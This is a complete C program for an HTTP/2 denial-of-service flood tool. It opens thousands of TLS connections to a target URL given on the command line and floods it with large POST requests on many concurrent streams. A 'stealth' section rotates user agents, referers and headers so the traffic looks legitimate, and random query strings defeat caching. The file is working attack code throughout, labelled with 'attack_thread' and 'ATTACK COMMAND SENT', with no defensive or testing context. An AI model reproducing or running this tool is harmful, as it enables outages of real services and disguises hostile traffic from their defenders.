#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sched.h>
#include <sys/epoll.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <fcntl.h>
#include <time.h>
#include <assert.h>
#include <errno.h>
#include <stdatomic.h>

#include <openssl/ssl.h>
#include <openssl/err.h>
#include <openssl/crypto.h>
#include <nghttp2/nghttp2.h>

// ====================================================================================
// --- CONFIGURATION
// ====================================================================================
#define NUM_ATTACK_THREADS 8
#define CONCURRENT_CONNECTIONS_PER_THREAD 512
#define MAX_CONCURRENT_STREAMS_PER_CONNECTION 100
#define PAYLOAD_SIZE (128 * 1024)

// Timeout được đặt ở 0.5 giây (500 triệu nano giây)
#define CONNECTION_TIMEOUT_NS 500000000L

// --- CONSOLE COLORS ---
#define C_RESET "\x1b[0m"
#define C_GREEN "\x1b[32m"
#define C_RED   "\x1b[31m"
#define C_CYAN  "\x1b[36m"
#define C_BOLD  "\x1b[1m"

// ====================================================================================
// --- STEALTH CONFIGURATION
// ====================================================================================
static const char* user_agents[] = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.2210.144"
};
static const char* referers[] = {
    "https://www.google.com/", "https://www.facebook.com/", "https://www.bing.com/", "https://vnexpress.net/",
    "https://dantri.com.vn/", "https://www.youtube.com/", "https://twitter.com/", "https://duckduckgo.com/"
};
static const char* accept_languages[] = {
    "en-US,en;q=0.9,vi;q=0.8", "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5", "en-GB,en;q=0.9", "ja-JP,ja;q=0.9"
};
static const char* accept_encodings[] = { "gzip, deflate, br", "gzip, deflate", "gzip" };
static const char* accepts[] = {
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    "application/json, text/plain, */*",
    "*/*"
};

// ====================================================================================
// --- DATA STRUCTURES
// ====================================================================================
typedef struct connection_s connection_t;
struct connection_s {
    int fd;
    SSL *ssl;
    nghttp2_session *ngh2_session;
    int thread_id;
    int epoll_fd;
    struct timespec last_activity; // Sử dụng timespec cho độ chính xác cao
};

typedef struct {
    int thread_id;
    atomic_ullong success_count;
    atomic_ullong failed_count;
} thread_context_t;

// ====================================================================================
// --- GLOBAL VARIABLES
// ====================================================================================
thread_context_t contexts[NUM_ATTACK_THREADS];
char *g_payload_buffer;
struct sockaddr_storage g_remote_addr;
nghttp2_data_provider g_payload_provider;
SSL_CTX *g_ssl_ctx;
char g_target_host[256];
char g_target_path[1024];
static pthread_mutex_t *ssl_locks;

// ====================================================================================
// --- OPENSSL THREAD-SAFETY CALLBACKS (DEADLOCK FIX)
// ====================================================================================
void locking_callback(int mode, int n, const char *file, int line) {
    if (mode & CRYPTO_LOCK) pthread_mutex_lock(&ssl_locks[n]);
    else pthread_mutex_unlock(&ssl_locks[n]);
}
unsigned long thread_id_callback(void) {
    return (unsigned long)pthread_self();
}

// ====================================================================================
// --- FORWARD DECLARATIONS
// ====================================================================================
static void submit_new_request(connection_t *conn);
static void reset_connection(connection_t *conn);

// ====================================================================================
// --- NGHTTP2 CALLBACKS
// ====================================================================================
ssize_t send_callback(nghttp2_session *session, const uint8_t *data, size_t length, int flags, void *user_data) {
    connection_t *conn = user_data; int rv; ERR_clear_error(); clock_gettime(CLOCK_MONOTONIC, &conn->last_activity);
    rv = SSL_write(conn->ssl, data, length);
    if (rv <= 0) { int err = SSL_get_error(conn->ssl, rv); if (err == SSL_ERROR_WANT_WRITE || err == SSL_ERROR_WANT_READ) return NGHTTP2_ERR_WOULDBLOCK; return NGHTTP2_ERR_CALLBACK_FAILURE; }
    return rv;
}
ssize_t recv_callback(nghttp2_session *session, uint8_t *buf, size_t length, int flags, void *user_data) {
    connection_t *conn = user_data; int rv; ERR_clear_error(); clock_gettime(CLOCK_MONOTONIC, &conn->last_activity);
    rv = SSL_read(conn->ssl, buf, length);
    if (rv < 0) { int err = SSL_get_error(conn->ssl, rv); if (err == SSL_ERROR_WANT_READ || err == SSL_ERROR_WANT_WRITE) return NGHTTP2_ERR_WOULDBLOCK; return NGHTTP2_ERR_CALLBACK_FAILURE; }
    if (rv == 0) return NGHTTP2_ERR_EOF;
    return rv;
}
int on_stream_close_callback(nghttp2_session *session, int32_t stream_id, uint32_t error_code, void *user_data) {
    connection_t *conn = user_data;
    if (error_code == NGHTTP2_NO_ERROR) atomic_fetch_add(&contexts[conn->thread_id].success_count, 1);
    else atomic_fetch_add(&contexts[conn->thread_id].failed_count, 1);
    submit_new_request(conn); return 0;
}
ssize_t payload_read_callback(nghttp2_session *session, int32_t stream_id, uint8_t *buf, size_t length, uint32_t *data_flags, nghttp2_data_source *source, void *user_data) {
    size_t to_copy = length < PAYLOAD_SIZE ? length : PAYLOAD_SIZE;
    memcpy(buf, g_payload_buffer, to_copy); *data_flags |= NGHTTP2_DATA_FLAG_EOF; return to_copy;
}

// ====================================================================================
// --- CORE LOGIC
// ====================================================================================
static void submit_new_request(connection_t *conn) {
    if (!conn || !conn->ngh2_session || !SSL_is_init_finished(conn->ssl)) return;

    char path_buf[sizeof(g_target_path) + 16];
    char req_id_buf[64];
    snprintf(path_buf, sizeof(path_buf), "%s?r=%u", g_target_path, (unsigned int)rand());
    snprintf(req_id_buf, sizeof(req_id_buf), "%lx-%x", (unsigned long)time(NULL), rand());

    const char* ua = user_agents[rand() % (sizeof(user_agents) / sizeof(char*))];
    const char* ref = referers[rand() % (sizeof(referers) / sizeof(char*))];
    const char* lang = accept_languages[rand() % (sizeof(accept_languages) / sizeof(char*))];
    const char* enc = accept_encodings[rand() % (sizeof(accept_encodings) / sizeof(char*))];
    const char* acc = accepts[rand() % (sizeof(accepts) / sizeof(char*))];

    nghttp2_nv headers[9]; // 6 standard + 3 custom/randomized
    int n = 0;
    #define PUSH_NV(NAME, VAL) headers[n++] = (nghttp2_nv){(uint8_t*)NAME, (uint8_t*)VAL, strlen(NAME), strlen(VAL), NGHTTP2_NV_FLAG_NONE}

    PUSH_NV(":method", "POST");
    PUSH_NV(":scheme", "https");
    PUSH_NV(":authority", g_target_host);
    PUSH_NV(":path", path_buf);
    PUSH_NV("user-agent", ua);
    PUSH_NV("referer", ref);
    PUSH_NV("accept-language", lang);
    PUSH_NV("accept-encoding", enc);
    PUSH_NV("accept", acc);

    nghttp2_submit_request(conn->ngh2_session, NULL, headers, n, &g_payload_provider, NULL);
}

static void reset_connection(connection_t *conn) {
    if (conn->fd != -1) { epoll_ctl(conn->epoll_fd, EPOLL_CTL_DEL, conn->fd, NULL); close(conn->fd); }
    if (conn->ngh2_session) nghttp2_session_del(conn->ngh2_session);
    if (conn->ssl) SSL_free(conn->ssl);
    conn->fd = socket(g_remote_addr.ss_family, SOCK_STREAM | SOCK_NONBLOCK, 0);
    if (conn->fd == -1) return;
    connect(conn->fd, (struct sockaddr*)&g_remote_addr, (g_remote_addr.ss_family == AF_INET) ? sizeof(struct sockaddr_in) : sizeof(struct sockaddr_in6));
    conn->ssl = SSL_new(g_ssl_ctx);
    SSL_set_fd(conn->ssl, conn->fd); SSL_set_connect_state(conn->ssl); SSL_set_tlsext_host_name(conn->ssl, g_target_host);
    nghttp2_session_callbacks *callbacks; nghttp2_session_callbacks_new(&callbacks);
    nghttp2_session_callbacks_set_send_callback(callbacks, send_callback);
    nghttp2_session_callbacks_set_recv_callback(callbacks, recv_callback);
    nghttp2_session_callbacks_set_on_stream_close_callback(callbacks, on_stream_close_callback);
    nghttp2_session_client_new(&conn->ngh2_session, callbacks, conn);
    nghttp2_session_callbacks_del(callbacks);
    nghttp2_settings_entry iv[1] = {{NGHTTP2_SETTINGS_MAX_CONCURRENT_STREAMS, MAX_CONCURRENT_STREAMS_PER_CONNECTION}};
    nghttp2_submit_settings(conn->ngh2_session, NGHTTP2_FLAG_NONE, iv, 1);
    struct epoll_event ev = {0}; ev.events = EPOLLIN | EPOLLOUT | EPOLLET | EPOLLERR | EPOLLHUP; ev.data.ptr = conn;
    epoll_ctl(conn->epoll_fd, EPOLL_CTL_ADD, conn->fd, &ev);
    clock_gettime(CLOCK_MONOTONIC, &conn->last_activity);
}

void handle_io(connection_t *conn) {
    if (nghttp2_session_send(conn->ngh2_session) != 0 || nghttp2_session_recv(conn->ngh2_session) != 0) {
        reset_connection(conn);
    }
}

// ====================================================================================
// --- THREADS
// ====================================================================================
void *attack_thread(void *arg) {
    thread_context_t *ctx = arg; int epoll_fd = epoll_create1(0);
    struct epoll_event events[CONCURRENT_CONNECTIONS_PER_THREAD];
    connection_t* connections = calloc(CONCURRENT_CONNECTIONS_PER_THREAD, sizeof(connection_t));
    for (int i = 0; i < CONCURRENT_CONNECTIONS_PER_THREAD; i++) {
        connections[i].thread_id = ctx->thread_id; connections[i].epoll_fd = epoll_fd; connections[i].fd = -1;
        reset_connection(&connections[i]);
    }

    struct timespec last_timeout_check, now;
    clock_gettime(CLOCK_MONOTONIC, &last_timeout_check);

    while(1) {
        int n = epoll_wait(epoll_fd, events, CONCURRENT_CONNECTIONS_PER_THREAD, 500); // Wait for max 0.5s
        clock_gettime(CLOCK_MONOTONIC, &now);

        for (int i = 0; i < n; i++) {
            connection_t *conn = events[i].data.ptr;
            if (events[i].events & (EPOLLERR | EPOLLHUP)) { reset_connection(conn); continue; }
            if (!SSL_is_init_finished(conn->ssl)) {
                if (SSL_do_handshake(conn->ssl) <= 0 && SSL_get_error(conn->ssl, 0) != SSL_ERROR_WANT_READ && SSL_get_error(conn->ssl, 0) != SSL_ERROR_WANT_WRITE) {
                    reset_connection(conn); continue;
                }
                if (SSL_is_init_finished(conn->ssl)) {
                    clock_gettime(CLOCK_MONOTONIC, &conn->last_activity);
                    for(int j = 0; j < MAX_CONCURRENT_STREAMS_PER_CONNECTION; j++) submit_new_request(conn);
                }
            } else { handle_io(conn); }
        }

        if ((now.tv_sec - last_timeout_check.tv_sec) > 0) {
            for (int i = 0; i < CONCURRENT_CONNECTIONS_PER_THREAD; ++i) {
                if (connections[i].fd != -1) {
                    long long diff_ns = (now.tv_sec - connections[i].last_activity.tv_sec) * 1000000000LL + (now.tv_nsec - connections[i].last_activity.tv_nsec);
                    if (diff_ns > CONNECTION_TIMEOUT_NS) {
                        reset_connection(&connections[i]);
                    }
                }
            }
            last_timeout_check = now;
        }
    }
    free(connections); close(epoll_fd); return NULL;
}

void *log_thread(void *arg) {
    (void)arg; unsigned long long last_total_requests = 0;
    struct timespec last_time, current_time; clock_gettime(CLOCK_MONOTONIC, &last_time);
    while (1) {
        sleep(1); clock_gettime(CLOCK_MONOTONIC, &current_time);
        double elapsed_seconds = (current_time.tv_sec - last_time.tv_sec) + (current_time.tv_nsec - last_time.tv_nsec) / 1e9;
        last_time = current_time; unsigned long long total_success = 0, total_failed = 0;
        for (int i = 0; i < NUM_ATTACK_THREADS; i++) {
            total_success += atomic_load(&contexts[i].success_count);
            total_failed += atomic_load(&contexts[i].failed_count);
        }
        unsigned long long current_total_requests = total_success + total_failed;
        unsigned long long new_requests = current_total_requests - last_total_requests;
        last_total_requests = current_total_requests;
        double rps = (elapsed_seconds > 0) ? (double)new_requests / elapsed_seconds : 0.0;
        printf("\x1b[2K\r" C_BOLD "[" C_RESET " " C_CYAN "⚡ RPS: %.0f" C_RESET " " C_GREEN "📤 Sent: %llu" C_RESET " " C_RED "🔥 Failed: %llu" C_RESET " " C_BOLD "]" C_RESET, rps, total_success, total_failed);
        fflush(stdout);
    }
    return NULL;
}

// ====================================================================================
// --- MAIN FUNCTION
// ====================================================================================
int main(int argc, char *argv[]) {
    if (argc != 2) { fprintf(stderr, "Usage: %s [url]\n", argv[0]); return 1; }
    char scheme[10]; g_target_path[0] = '/'; g_target_path[1] = '\0';
    sscanf(argv[1], "%9[^:]://%255[^/]%1023s", scheme, g_target_host, g_target_path);
    if(strcmp(scheme, "https") != 0) { fprintf(stderr, "URL must start with https://\n"); return 1; }
    
    struct addrinfo hints = {0}, *res; hints.ai_family = AF_UNSPEC; hints.ai_socktype = SOCK_STREAM;
    if (getaddrinfo(g_target_host, "443", &hints, &res) != 0) { perror("Failed to resolve host"); return 1; }
    memcpy(&g_remote_addr, res->ai_addr, res->ai_addrlen); freeaddrinfo(res);
    
    SSL_library_init(); OpenSSL_add_all_algorithms(); SSL_load_error_strings();
    ssl_locks = malloc(CRYPTO_num_locks() * sizeof(pthread_mutex_t));
    for (int i = 0; i < CRYPTO_num_locks(); i++) pthread_mutex_init(&ssl_locks[i], NULL);
    CRYPTO_set_id_callback(thread_id_callback);
    CRYPTO_set_locking_callback(locking_callback);
    
    g_ssl_ctx = SSL_CTX_new(TLS_client_method());
    SSL_CTX_set_alpn_protos(g_ssl_ctx, (const unsigned char*)"\x02h2", 3);
    
    srand(time(NULL) ^ getpid());
    g_payload_buffer = malloc(PAYLOAD_SIZE); memset(g_payload_buffer, 'A', PAYLOAD_SIZE);
    g_payload_provider.read_callback = payload_read_callback;
    
    pthread_t attack_threads[NUM_ATTACK_THREADS]; pthread_t logger_thread;
    long num_cores = sysconf(_SC_NPROCESSORS_ONLN);
    for (int i = 0; i < NUM_ATTACK_THREADS; i++) {
        contexts[i].thread_id = i; atomic_init(&contexts[i].success_count, 0); atomic_init(&contexts[i].failed_count, 0);
        pthread_attr_t attr; pthread_attr_init(&attr);
        cpu_set_t cpuset; CPU_ZERO(&cpuset); CPU_SET(i % num_cores, &cpuset);
        pthread_attr_setaffinity_np(&attr, sizeof(cpu_set_t), &cpuset);
        pthread_create(&attack_threads[i], &attr, attack_thread, &contexts[i]);
        pthread_attr_destroy(&attr);
    }
    
    pthread_create(&logger_thread, NULL, log_thread, NULL);
    printf(C_BOLD C_GREEN "📡 ATTACK COMMAND SENT !\n" C_RESET);
    fflush(stdout);
    
    for (int i = 0; i < NUM_ATTACK_THREADS; i++) pthread_join(attack_threads[i], NULL);
    pthread_join(logger_thread, NULL);
    
    CRYPTO_set_locking_callback(NULL);
    for (int i = 0; i < CRYPTO_num_locks(); i++) pthread_mutex_destroy(&ssl_locks[i]);
    free(ssl_locks);
    
    free(g_payload_buffer); SSL_CTX_free(g_ssl_ctx); return 0;
}